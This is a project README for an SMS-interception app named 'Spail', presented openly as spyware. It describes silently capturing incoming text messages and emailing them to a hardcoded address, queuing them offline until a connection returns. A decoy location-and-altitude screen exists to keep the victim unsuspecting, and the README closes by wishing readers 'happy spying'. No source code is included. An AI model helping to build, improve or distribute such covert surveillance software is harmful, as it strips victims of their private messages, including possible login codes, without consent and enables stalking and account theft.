# Spail
An app that intercepts incoming sms on that installed device and sents it to a remote user (to his/her email).

Features:

1) Let's consider a worst case scenario where the device is offline or even if internet connection is on there might be possiblity of the device 
not having any data left on his/her mobile.

In this particular scenario, all the incoming messages that are unable to send to the email harcoded 
are being saved to an offline database.
Now as soon as there is data connection, messages from the database are sent to the mail provided (hardcoded)
and deleted after sending successfully.

2) A main user interface is shown to the user that allows to know his/her current location and altitude.
Just to make the user think that nothing harmful is doing by this app.
    
3) In background, messages are intercepted and sent silently without raising any suspicions to the user.

##Enjoy and happy spying. :)
